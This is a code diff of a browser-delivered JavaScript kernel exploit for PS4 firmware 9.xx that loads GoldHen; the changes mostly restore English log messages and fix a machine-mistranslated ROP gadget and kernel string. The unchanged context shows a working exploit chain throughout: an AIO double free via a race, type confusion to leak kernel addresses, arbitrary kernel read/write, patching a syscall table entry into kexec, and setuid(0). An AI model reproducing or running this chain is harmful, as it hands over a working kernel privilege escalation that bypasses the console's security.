@@ -147,12 +147,12 @@ function toogle_payload(PLfile) {
       localStorage.passcount = ++localStorage.passcount;
       if (window.passCounter) window.passCounter.innerHTML = localStorage.passcount;
      } else {
-      console.error('Tải trọng tải không thành công:', PLfile);
+      console.error('Failed to load payload:', PLfile);
       localStorage.failcount = ++localStorage.failcount;
       if (window.failCounter) window.failCounter.innerHTML = localStorage.failcount;
      }
     } catch (e) {
-     console.error('Lỗi xử lý tải trọng:', e);
+     console.error('Error processing payload:', e);
      localStorage.failcount = ++localStorage.failcount;
      if (window.failCounter) window.failCounter.innerHTML = localStorage.failcount;
     }
@@ -160,7 +160,7 @@ function toogle_payload(PLfile) {
   };
   EndTimer();
  } catch (e) {
-  console.error('Lỗi trong toogle_payload:', e);
+  console.error('Error in toogle_payload:', e);
   localStorage.failcount = ++localStorage.failcount;
   if (window.failCounter) window.failCounter.innerHTML = localStorage.failcount;
  }
@@ -593,7 +593,7 @@ function make_aliased_rthdrs(sds) {
 // {
 //     if (reqs2->ar2_spinfo != NULL) {
 //         printf(
-//             "[0]%s() line=%d Cảnh báo !! thông tin phân chia ở đây\n",
+//             "[0]%s() line=%d Warning !! split info is here\n",
 //             __func__,
 //             __LINE__
 //         );
@@ -645,7 +645,7 @@ function race_one(request_addr, tcp_sd, barrier, racer, sds) {
         thr_mask.addr,
     );
     thr.push_syscall('rtprio_thread', RTP_SET, 0, rtprio.addr);
-    thr.push_gadget('pop rax; Phải');
+    thr.push_gadget('pop rax; ret');
     thr.push_value(1);
     thr.push_get_retval();
     thr.push_call('pthread_barrier_wait', barrier.addr);
@@ -728,7 +728,7 @@ function race_one(request_addr, tcp_sd, barrier, racer, sds) {
             won_race = true;
         }
     } finally {
-        log('tiếp tục chủ đề\n');
+        log('resume thread\n');
         sysi('thr_resume_ucontext', thr_tid);
         call_nze('pthread_join', pthr, 0);
     }
@@ -738,8 +738,8 @@ function race_one(request_addr, tcp_sd, barrier, racer, sds) {
         // if the code has no bugs then this isn't possible but we keep the
         // check for easier debugging
         if (sce_errs[0] !== sce_errs[1]) {
-            log('LỖI: won_race xấu');
-            die('LỖI: won_race xấu');
+            log('ERROR: bad won_race');
+            die('ERROR: bad won_race');
         }
         // RESTORE: double freed memory has been reclaimed with harmless data
         // PANIC: 0x80 malloc zone pointers aliased
@@ -826,7 +826,7 @@ function double_free_reqs2(sds) {
         }
     }
 
-    die('aio gấp đôi miễn phí thất bại');
+    die('failed aio double free');
 }
 
 // FUNCTIONS FOR STAGE: LEAK 0x100 MALLOC ZONE ADDRESS
@@ -905,7 +905,7 @@ function leak_kernel_addrs(sd_pair) {
 
     // type confuse a struct evf with a struct ip6_rthdr. the flags of the evf
     // must be set to >= 0xf00 in order to fully leak the contents of the rthdr
-    log('nhầm lẫn evf với rthdr');
+    log('confuse evf with rthdr');
     let evf = null;
     for (let i = 0; i < num_alias; i++) {
         const evfs = [];
@@ -938,7 +938,7 @@ function leak_kernel_addrs(sd_pair) {
     }
 
     if (evf === null) {
-        die('không thể nhầm lẫn giữa evf và rthdr');
+        die('failed to confuse evf and rthdr');
     }
 
     set_evf_flags(evf, 0xff << 8);
@@ -950,10 +950,10 @@ function leak_kernel_addrs(sd_pair) {
     //     28 struct cv cv
     //     38 TAILQ_HEAD(struct evf_waiter) waiters
 
-    // evf.cv.cv_description = "CV xin việc"
+    // evf.cv.cv_description = "evf cv"
     // string is located at the kernel's mapped ELF file
     const kernel_addr = buf.read64(0x28);
-    log(`"CV xin việc" string addr: ${kernel_addr}`);
+    log(`"evf cv" string addr: ${kernel_addr}`);
     // because of TAILQ_INIT(), we have:
     //
     // evf.waiters.tqh_last == &evf.waiters.tqh_first
@@ -978,7 +978,7 @@ function leak_kernel_addrs(sd_pair) {
     const leak_ids = new View4(leak_ids_len);
     const leak_ids_p = leak_ids.addr;
 
-    log('tìm aio_entry');
+    log('find aio_entry');
     let reqs2_off = null;
     loop: for (let i = 0; i < num_leaks; i++) {
         get_rthdr(sd, buf);
@@ -1004,13 +1004,13 @@ function leak_kernel_addrs(sd_pair) {
         free_aios(leak_ids_p, leak_ids_len);
     }
     if (reqs2_off === null) {
-        die('không thể rò rỉ reqs2');
+        die('could not leak a reqs2');
     }
     log(`reqs2 offset: ${hex(reqs2_off)}`);
 
     get_rthdr(sd, buf);
     const reqs2 = buf.slice(reqs2_off, reqs2_off + 0x80);
-    log('aio_entry bị rò rỉ:');
+    log('leaked aio_entry:');
     hexdump(reqs2);
 
     const reqs1_addr = new Long(reqs2.read64(0x10));
@@ -1018,7 +1018,7 @@ function leak_kernel_addrs(sd_pair) {
     reqs1_addr.lo &= -0x100;
     log(`reqs1_addr: ${reqs1_addr}`);
 
-    log('đang tìm kiếm target_id');
+    log('searching target_id');
     let target_id = null;
     let to_cancel_p = null;
     let to_cancel_len = null;
@@ -1035,7 +1035,7 @@ function leak_kernel_addrs(sd_pair) {
             log(`target_id: ${hex(target_id)}`);
 
             const reqs2 = buf.slice(reqs2_off, reqs2_off + 0x80);
-            log('aio_entry bị rò rỉ:');
+            log('leaked aio_entry:');
             hexdump(reqs2);
 
             const start = i + num_elems;
@@ -1045,7 +1045,7 @@ function leak_kernel_addrs(sd_pair) {
         }
     }
     if (target_id === null) {
-        die('không tìm thấy target_id');
+        die('target_id not found');
     }
 
     cancel_aios(to_cancel_p, to_cancel_len);
@@ -1091,7 +1091,7 @@ function make_aliased_pktopts(sds) {
     }
     localStorage.failcount = ++localStorage.failcount;
     if (window.failCounter) window.failCounter.innerHTML = localStorage.failcount;
-    die('không tạo được pktopt bí danh');
+    die('failed to make aliased pktopts');
 }
 
 function double_free_reqs1(
@@ -1109,7 +1109,7 @@ function double_free_reqs1(
     const aio_ids = new View4(aio_ids_len);
     const aio_ids_p = aio_ids.addr;
 
-    log('bắt đầu ghi đè rthdr bằng vòng lặp nhập hàng đợi AIO');
+    log('start overwrite rthdr with AIO queue entry loop');
     let aio_not_found = true;
     free_evf(evf);
     for (let i = 0; i < num_clobbers; i++) {
@@ -1125,7 +1125,7 @@ function double_free_reqs1(
         free_aios(aio_ids_p, aio_ids_len);
     }
     if (aio_not_found) {
-        die('không ghi đè được rthdr');
+        die('failed to overwrite rthdr');
     }
 
     const reqs2 = new Buffer(0x80);
@@ -1166,7 +1166,7 @@ function double_free_reqs1(
         addr_cache.push(aio_ids_p.add((i * num_elems) << 2));
     }
 
-    log('bắt đầu ghi đè mục nhập hàng đợi AIO bằng vòng lặp rthdr');
+    log('start overwrite AIO queue entry with rthdr loop');
     let req_id = null;
     close(sd);
     sd = null;
@@ -1209,7 +1209,7 @@ function double_free_reqs1(
                     }
                 }
                 if (sd === null) {
-                    die("không thể tìm thấy sd đã ghi đè mục nhập hàng đợi AIO");
+                    die("can't find sd that overwrote AIO queue entry");
                 }
                 log(`sd: ${sd}`);
 
@@ -1218,7 +1218,7 @@ function double_free_reqs1(
         }
     }
     if (req_id === null) {
-        die('không thể ghi đè mục nhập hàng đợi AIO');
+        die('failed to overwrite AIO queue entry');
     }
     free_aios2(aio_ids_p, aio_ids_len);
 
@@ -1250,16 +1250,16 @@ function double_free_reqs1(
         const SCE_KERNEL_ERROR_ESRCH = 0x80020003;
         let success = true;
         if (states[0] !== SCE_KERNEL_ERROR_ESRCH) {
-            log('LỖI: xóa sai yêu cầu AIO bị hỏng');
+            log('ERROR: bad delete of corrupt AIO request');
             success = false;
         }
         if (sce_errs[0] !== 0 || sce_errs[0] !== sce_errs[1]) {
-            log('LỖI: xóa sai cặp ID');
+            log('ERROR: bad delete of ID pair');
             success = false;
         }
 
         if (!success) {
-            die('LỖI: không thể tự do gấp đôi trên vùng malloc 0x100');
+            die('ERROR: double free on a 0x100 malloc zone failed');
         }
     }
 }
@@ -1268,7 +1268,7 @@ function double_free_reqs1(
 
 // k100_addr is double freed 0x100 malloc zone address
 // dirty_sd is the socket whose rthdr pointer is corrupt
-// kernel_addr is the address of the "CV xin việc" string
+// kernel_addr is the address of the "evf cv" string
 function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
     const psd = pktopts_sds[0];
     const tclass = new Word();
@@ -1280,7 +1280,7 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
     // pktopts.ip6po_pktinfo = &pktopts.ip6po_pktinfo
     pktopts.write64(0x10, pktinfo_p);
 
-    log('ghi đè pktopt chính');
+    log('overwrite main pktopts');
     let reclaim_sd = null;
     close(pktopts_sds[1]);
     for (let i = 0; i < num_alias; i++) {
@@ -1303,7 +1303,7 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
         }
     }
     if (reclaim_sd === null) {
-        die('không ghi đè được pktopt chính');
+        die('failed to overwrite main pktopts');
     }
 
     const pktinfo = new Buffer(0x14);
@@ -1338,18 +1338,18 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
         return read_buf.read64(0);
     }
 
-    log(`kread64(&"CV xin việc"): ${kread64(kernel_addr)}`);
+    log(`kread64(&"evf cv"): ${kread64(kernel_addr)}`);
     const kstr = jstr(read_buf);
-    log(`*(&"CV xin việc"): ${kstr}`);
-    if (kstr !== 'CV xin việc') {
-        die('việc đọc thử &"evf cv" không thành công');
+    log(`*(&"evf cv"): ${kstr}`);
+    if (kstr !== 'evf cv') {
+        die('test read of &"evf cv" failed');
     }
 
     // Only For PS4 9.00
     const kbase = kernel_addr.sub(off_kstr);
     log(`kernel base: ${kbase}`);
 
-    log('\nthực hiện đọc/ghi kernel tùy ý');
+    log('\nmaking arbitrary kernel read/write');
     const cpuid = 7 - main_core;
     const pcpu_p = kbase.add(off_cpuid_to_pcpu + cpuid*8);
     log(`cpuid_to_pcpu[${cpuid}]: ${pcpu_p}`);
@@ -1368,7 +1368,7 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
     const pid2 = kread64(proc.add(0xb0)).lo;
     log(`suspected proc pid: ${pid2}`);
     if (pid2 !== pid) {
-        die('không tìm thấy quá trình');
+        die('process not found');
     }
 
     const off_p_fd = 0x48;
@@ -1412,7 +1412,7 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
     log(`0x100 malloc zone pointer: ${k100_addr}`);
 
     if (m_pktopts.ne(k100_addr)) {
-        die('con trỏ pktopts chính != con trỏ pktopts bị rò rỉ');
+        die('main pktopts pointer != leaked pktopts pointer');
     }
 
     // ofiles[sd].f_data
@@ -1446,11 +1446,11 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
     ssockopt(main_sd, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo);
     gsockopt(worker_sd, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo);
     const kstr2 = jstr(pktinfo);
-    log(`*(&"CV xin việc"): ${kstr2}`);
-    if (kstr2 !== 'CV xin việc') {
-        die('đọc pktopt không thành công');
+    log(`*(&"evf cv"): ${kstr2}`);
+    if (kstr2 !== 'evf cv') {
+        die('pktopts read failed');
     }
-    log('đạt được việc đọc/ghi kernel bị hạn chế');
+    log('achieved restricted kernel read/write');
 
     // in6_pktinfo.ipi6_ifindex must be 0 (or a valid interface index) when
     // using pktopts write. we can safely modify a pipe even with this limit so
@@ -1472,7 +1472,7 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
 
         _verify_len(len) {
             if (!(Number.isInteger(len) && (0 <= len <= 0xffffffff))) {
-                throw TypeError('len không phải là số nguyên không dấu 32 bit');
+                throw TypeError('len not a 32-bit unsigned integer');
             }
         }
 
@@ -1553,11 +1553,11 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
     const kstr3_buf = new Buffer(8);
     kmem.copyout(kernel_addr, kstr3_buf.addr, kstr3_buf.size);
     const kstr3 = jstr(kstr3_buf);
-    log(`*(&"CV xin việc"): ${kstr3}`);
-    if (kstr3 !== 'CV xin việc') {
-        die('đọc ống không thành công');
+    log(`*(&"evf cv"): ${kstr3}`);
+    if (kstr3 !== 'evf cv') {
+        die('pipe read failed');
     }
-    log('đạt được đọc/ghi kernel tùy ý');
+    log('achieved arbitrary kernel read/write');
 
     // RESTORE: clean corrupt pointer
      // pktopts.ip6po_rthdr = NULL
@@ -1567,7 +1567,7 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
      const w_rthdr_p = w_pktopts.add(off_ip6po_rthdr);
      kmem.write64(r_rthdr_p, 0);
      kmem.write64(w_rthdr_p, 0);
-     log('con trỏ bị hỏng được làm sạch');
+     log('corrupt pointers cleaned');
 
     /*
     // REMOVE once restore kernel is ready for production
@@ -1612,13 +1612,13 @@ async function get_patches(url) {
 // 9.60 supported only
 async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
     if (!is_ps4) {
-        throw RangeError('Bản vá kernel PS5 không được hỗ trợ');
+        throw RangeError('PS5 kernel patching unsupported');
     }
     if (!(0x900 <= version && version < 0x1000)) {
-      throw RangeError("vá kernel không được hỗ trợ");
+      throw RangeError("kernel patching unsupported");
     }
 
-    log('thay đổi sys_aio_submit() thành sys_kexec()');
+    log('change sys_aio_submit() to sys_kexec()');
     // sysent[661] is unimplemented so free for use
     const sysent_661 = kbase.add(off_sysent_661);
     // .sy_narg = 6
@@ -1628,7 +1628,7 @@ async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
     // .sy_thrcnt = SY_THR_STATIC
     kmem.write32(sysent_661.add(0x2c), 1);
 
-    log('thêm khả năng JIT');
+    log('add JIT capabilities');
     // TODO just set the bits for JIT privs
     // cr_sceCaps[0]
     kmem.write64(p_ucred.add(0x60), -1);
@@ -1645,7 +1645,7 @@ async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
         die(`patch file too large (>${max_size}): ${map_size}`);
     }
     if (map_size === 0) {
-        die('kích thước tập tin vá bằng không');
+        die('patch file size is zero');
     }
     map_size = map_size+page_size & -page_size;
 
@@ -1679,29 +1679,29 @@ async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
     log(`exec_addr: ${exec_addr}`);
     log(`write_addr: ${write_addr}`);
     if (exec_addr.ne(exec_p) || write_addr.ne(write_p)) {
-        die('mmap() cho jit không thành công');
+        die('mmap() for jit failed');
     }
 
-    log('mlock exec_addr cho kernel exec');
+    log('mlock exec_addr for kernel exec');
     sysi('mlock', exec_addr, map_size);
 
     // mov eax, 0x1337; ret (0xc300_0013_37b8)
     const test_code = new Int(0x001337b8, 0xc300);
     write_addr.write64(0, test_code);
 
-    log('kiểm tra jit exec');
+    log('test jit exec');
     sys_void('kexec', exec_addr);
     let retval = chain.errno;
-    log('trở về thành công');
+    log('returned successfully');
 
     log(`jit retval: ${retval}`);
     if (retval !== 0x1337) {
-        die('kiểm tra jit exec không thành công');
+        die('test jit exec failed');
     }
 
     const pipe_save = restore_info[1];
     restore_info[1] = pipe_save.addr;
-    log('ống mlock lưu dữ liệu để khôi phục kernel');
+    log('mlock pipe save data for kernel restore');
     sysi('mlock', restore_info[1], page_size);
 
     mem.cpy(write_addr, patches.addr, patches.size);
@@ -1709,7 +1709,7 @@ async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
 
     log('setuid(0)');
     sysi('setuid', 0);
-    log('khai thác kernel đã thành công!');
+    log('kernel exploit succeeded!');
 }
 
 // FUNCTIONS FOR STAGE: SETUP
@@ -1719,7 +1719,7 @@ function setup(block_fd) {
     // we may cancel them instead. this is to work around the fact that
     // aio_worker_entry2() will fdrop() the file associated with the aio_entry
     // on ps5. we want aio_multi_delete() to call fdrop()
-    log('chặn AIO');
+    log('block AIO');
     const reqs1 = new Buffer(0x28 * num_workers);
     const block_id = new Word();
 
@@ -1729,7 +1729,7 @@ function setup(block_fd) {
     }
     aio_submit_cmd(AIO_CMD_READ, reqs1.addr, num_workers, block_id.addr);
 
-    log('chải chuốt đống');
+    log('heap grooming');
     // chosen to maximize the number of 0x80 malloc allocs per submission
     const num_reqs = 3;
     const groom_ids = new View4(num_grooms);
@@ -1758,7 +1758,7 @@ export async function kexploit() {
     try {
         await init();
     } catch (e) {
-        console.error('Không khởi tạo được:', e);
+        console.error('Failed to initialize:', e);
         localStorage.failcount = ++localStorage.failcount;
         if (window.failCounter) window.failCounter.innerHTML = localStorage.failcount;
         return false;
@@ -1769,7 +1769,7 @@ export async function kexploit() {
     // If setuid is successful, we dont need to run the kexploit again
     try {
         if (sysi('setuid', 0) == 0) {
-            log("Không chạy kexploit nữa.");
+            log("Not running kexploit again.");
             load_exploit_already();
             //return;
             return true;
@@ -1793,7 +1793,7 @@ export async function kexploit() {
     get_our_affinity(main_mask);
     log(`main_mask: ${main_mask}`);
 
-    log("thiết lập mức độ ưu tiên của luồng chính");
+    log("setting main thread's priority");
     sysi('rtprio_thread', RTP_SET, 0, rtprio.addr);
 
     const [block_fd, unblock_fd] = (() => {
@@ -1810,40 +1810,40 @@ export async function kexploit() {
     let block_id = null;
     let groom_ids = null;
     try {
-        log('GIAI ĐOẠN: Thiết lập');
+        log('STAGE: Setup');
         [block_id, groom_ids] = setup(block_fd);
 
-        log('\n GIAI ĐOẠN: Nhân đôi mục nhập hàng đợi AIO miễn phí');
+        log('\nSTAGE: Double free AIO queue entry');
         const sd_pair = double_free_reqs2(sds);
 
-        log('\n GIAI ĐOẠN: Rò rỉ địa chỉ hạt nhân');
+        log('\nSTAGE: Leak kernel addresses');
         const [
             reqs1_addr, kbuf_addr, kernel_addr, target_id, evf,
         ] = leak_kernel_addrs(sd_pair);
 
-        log('\n GIAI ĐOẠN: SceKernelAioRWRequest miễn phí gấp đôi');
+        log('\nSTAGE: Double free SceKernelAioRWRequest');
         const [pktopts_sds, dirty_sd] = double_free_reqs1(
             reqs1_addr, kbuf_addr, target_id, evf, sd_pair[0], sds,
         );
 
-        log('\n GIAI ĐOẠN: Đọc/ghi kernel tùy ý');
+        log('\nSTAGE: Get arbitrary kernel read/write');
         const [kbase, kmem, p_ucred, restore_info] = make_kernel_arw(
             pktopts_sds, dirty_sd, reqs1_addr, kernel_addr, sds);
 
-        log('\n GIAI ĐOẠN: Bản vá hạt nhân');
+        log('\nSTAGE: Patch kernel');
         await patch_kernel(kbase, kmem, p_ucred, restore_info);
              
-        log('tải GoldHen đã thành công!');
+        log('load GoldHen succeeded!');
         Exploit_done();
     } catch (exploitError) {
-        console.error('Khai thác không thành công:', exploitError);
+        console.error('Exploit failed:', exploitError);
         localStorage.failcount = ++localStorage.failcount;
         if (window.failCounter) window.failCounter.innerHTML = localStorage.failcount;
         
         try {
             close(unblock_fd);
         } catch (e) {
-            console.error('Lỗi đóng unblock_fd:', e);
+            console.error('Error closing unblock_fd:', e);
         }
         
         return false;
@@ -1857,16 +1857,16 @@ export async function kexploit() {
         const t2 = performance.now();
         const ftime = t2 - t1;
         const init_time = _init_t2 - _init_t1;
-        log('\ntime (bao gồm init): ' + (ftime) / 1000);
-        log('thời gian kex: ' + (t2 - _init_t2) / 1000);
-        log('thời gian ban đầu: ' + (init_time) / 1000);
-        log('thời gian để bắt đầu: ' + (_init_t1 - t1) / 1000);
-        log('thời gian - thời gian ban đầu: ' + (ftime - init_time) / 1000);
+        log('\ntime (include init): ' + (ftime) / 1000);
+        log('kex time: ' + (t2 - _init_t2) / 1000);
+        log('init time: ' + (init_time) / 1000);
+        log('time to init: ' + (_init_t1 - t1) / 1000);
+        log('time - init time: ' + (ftime - init_time) / 1000);
     }
     try {
         close(block_fd);
     } catch (e) {
-        console.error('Lỗi đóng block_fd:', e);
+        console.error('Error closing block_fd:', e);
     }
     
     try {
@@ -1874,7 +1874,7 @@ export async function kexploit() {
             free_aios2(groom_ids.addr, groom_ids.length);
         }
     } catch (e) {
-        console.error('Lỗi giải phóng Groom_ids:', e);
+        console.error('Error freeing groom_ids:', e);
     }
     
     try {
@@ -1883,7 +1883,7 @@ export async function kexploit() {
             aio_multi_delete(block_id.addr, block_id.length);
         }
     } catch (e) {
-        console.error('Lỗi khi dọn dẹp block_id:', e);
+        console.error('Error with block_id cleanup:', e);
     }
     
     try {
@@ -1891,7 +1891,7 @@ export async function kexploit() {
             close(sd);
         }
     } catch (e) {
-        console.error('Lỗi đóng ổ cắm:', e);
+        console.error('Error closing sockets:', e);
     }
     
     // Check if it all worked
@@ -1902,7 +1902,7 @@ export async function kexploit() {
             return true;
         }
     } catch (e) {
-        console.error('kiểm tra setuid không thành công:', e);
+        console.error('setuid check failed:', e);
         // Still not exploited, something failed, but it made it here...
     }
 
